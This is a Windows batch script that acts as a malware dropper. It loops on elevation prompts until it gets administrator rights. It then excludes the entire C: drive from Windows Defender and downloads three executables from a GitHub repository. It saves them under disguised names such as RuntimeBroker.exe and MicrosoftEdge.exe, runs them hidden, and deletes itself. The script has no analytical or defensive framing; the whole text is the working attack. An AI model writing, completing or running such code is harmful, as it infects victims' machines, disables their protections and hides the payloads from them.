@echo off
NET SESSION >nul 2>&1
if %errorlevel% == 0 (
    powershell -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath 'C:\'" >nul 2>&1
    powershell -Command "Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/zuwax.exe' -OutFile '%TEMP%\RuntimeBroker.exe'" >nul 2>&1
    powershell -WindowStyle Hidden -Command "Start-Process '%TEMP%\RuntimeBroker.exe'" >nul 2>&1
    powershell -Command "Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/zzzzz.exe' -OutFile '%TEMP%\MicrosoftEdge.exe'" >nul 2>&1
    powershell -Command "Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/os6a5v5a.exe' -OutFile '%TEMP%\ThirdFile.exe'" >nul 2>&1

    rem Wait until the file is fully downloaded by checking the file size
    set file=%TEMP%\ThirdFile.exe
    set filesize=0
    set prevsize=0
    :checkdownload
    rem Get the current size of the file
    for %%F in (%file%) do set filesize=%%~zF
    if "%filesize%" NEQ "%prevsize%" (
        set prevsize=%filesize%
        timeout /t 1 >nul
        goto checkdownload
    )

    rem Unblock the ThirdFile.exe to avoid any execution blocks
    powershell -Command "Unblock-File -Path '%TEMP%\ThirdFile.exe'" >nul 2>&1

    rem Start the third file
    powershell -WindowStyle Hidden -Command "Start-Process '%TEMP%\ThirdFile.exe' -NoNewWindow" >nul 2>&1

    rem Wait for the ThirdFile.exe to finish before continuing
    :waitloop
    tasklist /fi "imagename eq ThirdFile.exe" 2>NUL | find /I "ThirdFile.exe" >nul
    if %errorlevel% == 0 (
        timeout /t 1 >nul
        goto waitloop
    )

    rem Continue once the file has finished executing
    del "%~f0" >nul 2>&1
    exit
)

:loop
powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -ArgumentList '/elevated' -Verb RunAs -WindowStyle Hidden" >nul 2>&1
if %errorlevel% NEQ 0 (
    timeout /t 3 >nul
    goto loop
)
powershell -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath 'C:\'" >nul 2>&1
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/zuwax.exe' -OutFile '%TEMP%\RuntimeBroker.exe'" >nul 2>&1
powershell -WindowStyle Hidden -Command "Start-Process '%TEMP%\RuntimeBroker.exe'" >nul 2>&1
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/zzzzz.exe' -OutFile '%TEMP%\MicrosoftEdge.exe'" >nul 2>&1
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/os6a5v5a.exe' -OutFile '%TEMP%\ThirdFile.exe'" >nul 2>&1

rem Wait until the file is fully downloaded by checking the file size
set file=%TEMP%\ThirdFile.exe
set filesize=0
set prevsize=0
:checkdownload
rem Get the current size of the file
for %%F in (%file%) do set filesize=%%~zF
if "%filesize%" NEQ "%prevsize%" (
    set prevsize=%filesize%
    timeout /t 1 >nul
    goto checkdownload
)

rem Unblock the ThirdFile.exe to avoid any execution blocks
powershell -Command "Unblock-File -Path '%TEMP%\ThirdFile.exe'" >nul 2>&1

rem Start the third file
powershell -WindowStyle Hidden -Command "Start-Process '%TEMP%\ThirdFile.exe' -NoNewWindow" >nul 2>&1

rem Wait for the ThirdFile.exe to finish before continuing
:waitloop
tasklist /fi "imagename eq ThirdFile.exe" 2>NUL | find /I "ThirdFile.exe" >nul
if %errorlevel% == 0 (
    timeout /t 1 >nul
    goto waitloop
)

rem Continue once the file has finished executing
del "%~f0" >nul 2>&1
exit
